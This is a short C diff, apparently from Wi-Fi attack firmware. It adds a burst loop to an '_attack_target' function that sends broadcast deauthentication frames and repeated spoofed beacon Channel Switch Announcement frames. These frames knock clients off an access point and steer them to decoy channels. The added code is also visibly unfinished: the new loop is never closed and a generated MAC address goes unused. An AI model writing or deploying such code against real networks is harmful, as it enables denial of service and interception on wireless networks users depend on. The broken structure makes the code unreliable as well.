@@ -333,6 +333,29 @@ static uint32_t _attack_target(BeaconClone* t) {
     uint16_t reason = reasons[t->cycle_count % (sizeof(reasons) / sizeof(reasons[0]))];
     uint32_t sent = 0;
 
+    for (int burst = 0; burst < BURST_COUNT; burst++) {
+        g_mac_counter += 0x00000137;
+        uint8_t rand_mac[6] = {
+            0x02,
+            (uint8_t)(g_mac_counter >> 16),
+            (uint8_t)(g_mac_counter >> 8),
+            (uint8_t)(g_mac_counter),
+            (uint8_t)(burst ^ 0xA5),
+            0xBB
+        };
+
+        if (wifi_tx_deauth_nav(bssid, bcast, reason)) sent++;
+
+        uint8_t ghost_ch;
+        if (is5GHz) {
+            ghost_ch = csa_ghost_5g[csa_idx % sizeof(csa_ghost_5g)];
+        } else {
+            ghost_ch = csa_ghost_24[csa_idx % sizeof(csa_ghost_24)];
+        }
+        csa_idx++;
+        if (wifi_tx_beacon_csa_frame(bssid, bcast, "", ghost_ch)) sent++;
+        if (wifi_tx_beacon_csa_frame(bssid, bcast, "", ghost_ch)) sent++;
+
     for (int i = 0; i < num_targets; i++) {
         if (targets[i].state == INT_STATE_CAPTURING) return INT_STATE_CAPTURING;
     }
